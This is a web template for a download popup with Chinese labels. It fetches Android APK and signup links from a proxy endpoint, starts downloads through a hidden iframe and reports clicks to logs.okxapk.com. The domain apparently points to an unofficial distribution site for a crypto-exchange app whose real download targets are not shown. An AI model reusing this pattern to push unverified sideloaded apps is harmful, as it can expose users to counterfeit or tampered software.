<!-- 页面下载按钮，可以放多个 -->
<?php
//navbtn.php
?>
<a href="#" class="btn-show-download px-8 py-4 bg-green-500 text-white font-bold rounded-md hover:bg-green-600 transition">安卓下载 | 苹果注册</a>

<!-- 遮罩层 -->
<div id="modalOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%;
     background:rgba(0,0,0,0.6); z-index:9998;"></div>

<!-- 弹窗模板 -->
<div id="downloadModal" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
     background:#1c1c1c; color:#fff; padding:20px; border-radius:10px; z-index:9999; 
     box-shadow:0 0 15px rgba(0,0,0,0.5); text-align:center; min-width:260px;">
  
  <h5 style="margin:0 0 15px 0;">请选择使用方式</h5>

  <div class="btn-group" style="margin-top:10px; display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
  <button class="btn btn-primary" id="btn-app-primary">
    安卓下载1 <span class="loader" id="loader1"></span>
  </button>
  <button class="btn btn-primary" id="btn-app-backup1">
    安卓下载2 <span class="loader" id="loader2"></span>
  </button>
  <button class="btn btn-secondary" id="btn-web-primary">
    在线注册 <span class="loader" id="loader3"></span>
  </button>
  <button class="btn btn-tertiary" id="btn-web-backup1">
    创建账户 <span class="loader" id="loader4"></span>
  </button>
  </div>
<button id="btn-close-modal" style="margin-top:20px;" class="px-3 py-1 bg-green-500 text-white font-bold rounded hover:bg-green-600 transition">关闭窗口</button>

</div>


<style>
.loader {
  display: none;               /* 默认隐藏 */
  width: 1em;
  height: 1em;
  border: 2px solid #fff;
  border-top: 2px solid transparent;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin-left: 0.5em;
}
@keyframes spin {
  0% { transform: rotate(0deg);}
  100% { transform: rotate(360deg);}
}

/* 可选统一按钮颜色 */
.btn-primary { background-color:#4CAF50; color:#fff; border:none; }
.btn-secondary { background-color:#2196F3; color:#fff; border:none; }
.btn-tertiary { background-color:#FF9800; color:#fff; border:none; }
.btn-primary:hover, .btn-secondary:hover, .btn-tertiary:hover { opacity:0.8; }

/* 下载弹窗按钮统一样式 */
#downloadModal .btn {
  padding: 0.5rem 1rem;
  font-weight: 500;
  border-radius: 6px;
  min-width: 120px;
  margin-right: 0.5rem;
  transition: all 0.2s ease;
}

/* 安卓下载按钮 - 主按钮 */
#btn-primary {
  background: #28a745;  /* 亮绿 */
  color: #fff;
  border: none;
}
#btn-primary:hover {
  background: #218838;
}

/* 在线注册按钮 - 次按钮 */
#btn-backup1 {
  background: #007bff;  /* 蓝色 */
  color: #fff;
  border: none;
}
#btn-backup1:hover {
  background: #0069d9;
}

/* 备用下载按钮 - 三按钮 */
#btn-backup2 {
  background: #ffc107;  /* 黄色 */
  color: #000;          /* 黑色字体保证可读 */
  border: none;
}
#btn-backup2:hover {
  background: #e0a800;
}

/* loader 小圆圈 */
.loader {
  display: none;
  width: 1em;
  height: 1em;
  border: 2px solid #fff;
  border-top: 2px solid transparent;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin-left: 0.5em;
}
@keyframes spin {
  0% { transform: rotate(0deg);}
  100% { transform: rotate(360deg);}
}
 

</style>

<script>
let downloadLinks = {};
let webLinks = {};

// 请求远程链接
fetch('/proxy_links.php')
  .then(res => res.json())
  .then(data => {
    downloadLinks = data?.app || {};
    webLinks = data?.web || {};
  })
  .catch(() => {
    downloadLinks = {};
    webLinks = {};
  });

// 通用下载函数（安卓）
function startDownload(key, btnId, loaderId) {
  const url = downloadLinks[key];
  if (!url) return alert('下载链接暂不可用，请稍后重试');

  const btn = document.getElementById(btnId);
  const loader = document.getElementById(loaderId);

  btn.disabled = true;
  loader.style.display = 'inline-block';

  // 使用 iframe 触发下载
  let iframe = document.getElementById('download_iframe');
  if (!iframe) {
    iframe = document.createElement('iframe');
    iframe.id = 'download_iframe';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
  }
  iframe.src = url;

  // 日志上报
  fetch('https://logs.okxapk.com/log/log_down.php', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({
      type: 'app-' + key,
      source: window.location.href,
      target: new URL(url).hostname,
      ua: navigator.userAgent
    }),
    keepalive:true
  }).catch(()=>{});

  setTimeout(() => {
    btn.disabled = false;
    loader.style.display = 'none';
  }, 3000);
}

// 通用跳转函数（web）
function startRedirect(key, btnId, loaderId) {
  const url = webLinks[key];
  if (!url) return alert('链接暂不可用，请稍后重试');

  const btn = document.getElementById(btnId);
  const loader = document.getElementById(loaderId);

  btn.disabled = true;
  loader.style.display = 'inline-block';

  setTimeout(() => {
    window.open(url,'_blank');

    // 日志上报
    fetch('https://logs.okxapk.com/log/log_sigup.php', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        type: 'web-' + key,
        source: window.location.href,
        target: new URL(url).hostname,
        ua: navigator.userAgent
      }),
      keepalive:true
    }).catch(()=>{});

    btn.disabled = false;
    loader.style.display = 'none';
  }, 500);
}

// 弹窗显示和关闭
document.querySelectorAll('.btn-show-download').forEach(btn => {
  btn.addEventListener('click', e => {
    e.preventDefault();
    document.getElementById('modalOverlay').style.display = 'block';
    document.getElementById('downloadModal').style.display = 'block';
  });
});

document.getElementById('btn-close-modal').addEventListener('click', () => {
  document.getElementById('modalOverlay').style.display = 'none';
  document.getElementById('downloadModal').style.display = 'none';
});

document.getElementById('modalOverlay').addEventListener('click', () => {
  document.getElementById('modalOverlay').style.display = 'none';
  document.getElementById('downloadModal').style.display = 'none';
});

// 绑定按钮事件（对应更新后的 4 个按钮）
document.getElementById('btn-app-primary').addEventListener('click', () => startDownload('primary','btn-app-primary','loader1'));
document.getElementById('btn-app-backup1').addEventListener('click', () => startDownload('backup1','btn-app-backup1','loader2'));
document.getElementById('btn-web-primary').addEventListener('click', () => startRedirect('primary','btn-web-primary','loader3'));
document.getElementById('btn-web-backup1').addEventListener('click', () => startRedirect('backup1','btn-web-backup1','loader4'));
</script>
